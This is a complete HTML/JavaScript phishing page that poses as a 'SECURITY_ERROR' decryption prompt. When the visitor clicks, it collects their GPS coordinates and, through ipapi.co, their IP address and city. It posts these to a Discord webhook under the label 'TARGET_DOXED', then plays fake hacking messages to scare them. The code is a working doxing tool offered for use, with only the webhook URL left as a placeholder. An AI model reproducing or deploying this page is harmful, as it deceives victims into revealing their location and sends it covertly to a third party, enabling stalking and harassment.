<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_CRITICAL</title> 
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
            background: url('https://images.unsplash.com/photo-1500622764614-be3c178304c3?q=80&w=2070') no-repeat center center fixed; 
            background-size: cover;
            font-family: 'Courier New', monospace;
            display: flex; align-items: center; justify-content: center;
        }

        /* DARK GLITCH OVERLAY */
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(4px); z-index: 1;
        }

        /* THE TRAP BOX */
        #trap-box {
            position: relative; z-index: 10;
            background: rgba(10, 10, 10, 0.9);
            padding: 30px; border: 2px solid #ff0000;
            box-shadow: 0 0 20px #ff0000;
            text-align: center; width: 85%; max-width: 400px;
            color: #ff0000;
        }

        h2 { text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
        p { color: #ccc; font-size: 0.85rem; margin-bottom: 25px; }

        #start-btn { 
            background: transparent; color: #ff0000; border: 2px solid #ff0000;
            padding: 15px; font-size: 1rem; font-weight: bold; width: 100%;
            cursor: pointer; transition: 0.2s;
        }

        #start-btn:hover { background: #ff0000; color: black; box-shadow: 0 0 15px #ff0000; }

        /* THE HACKER CONSOLE */
        #console { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 100; display: none;
            flex-direction: column; align-items: center; justify-content: center;
            color: #00FF41;
        }
        #log { width: 90%; max-width: 600px; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div id="overlay"></div>

    <div id="trap-box">
        <h2>⚠️ SECURITY_ERROR</h2>
        <p>ENCRYPTED CONTENT DETECTED. PLEASE VERIFY LOCATION TO DECRYPT DATA STREAM.</p>
        <button id="start-btn" onclick="ignite()">[ INITIALIZE_DECRYPT ]</button>
    </div>

    <div id="console">
        <div id="log">
            <h1 style="color:red; text-shadow: 0 0 10px red;">> [ BREACH_ESTABLISHED ]</h1>
            <div id="output"></div>
        </div>
    </div>

    <script>
        const WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 

        async function ignite() {
            // STEP 1: Show Hacking Immediately
            document.getElementById('trap-box').style.display = 'none';
            document.getElementById('console').style.display = 'flex';
            
            // STEP 2: The GPS Trap
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                    () => sendData("DENIED", "DENIED", 0)
                );
            }
            runHackerTyping();
        }

        async function sendData(lat, lon, acc) {
            const ipFetch = await fetch('https://ipapi.co/json/');
            const ipData = await ipFetch.json();

            const payload = {
                content: "🛑 **Mody12_S - TARGET_DOXED** 🛑",
                embeds: [{
                    color: 16711680,
                    title: "CRITICAL_DATA_EXTRACTED",
                    fields: [
                        { name: "👤 IP", value: `\`${ipData.ip}\``, inline: true },
                        { name: "📍 CITY", value: ipData.city, inline: true },
                        { name: "🎯 GPS_LOCK", value: lat !== "DENIED" ? `[OPEN_MAP](https://www.google.com/maps?q=${lat},${lon})` : "❌ REJECTED", inline: false },
                        { name: "📏 ACCURACY", value: `${acc} meters`, inline: true }
                    ]
                }]
            };

            fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
        }

        function runHackerTyping() {
            const lines = ["BYPASSING_BROWSER...", "TRIANGULATING_GPS...", "UPLOADING_LOGS...", "STEALING_WIFI_PASS...", "CRITICAL_TRACE!", "PURGING_SYSTEM..."];
            let i = 0;
            const interval = setInterval(() => {
                if (i < lines.length) {
                    document.getElementById('output').innerHTML += `<p>> ${lines[i]}</p>`;
                    i++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => { document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>SYSTEM_DESTROYED</h1>"; }, 1500);
                }
            }, 800);
        }
    </script>
</body>
</html>
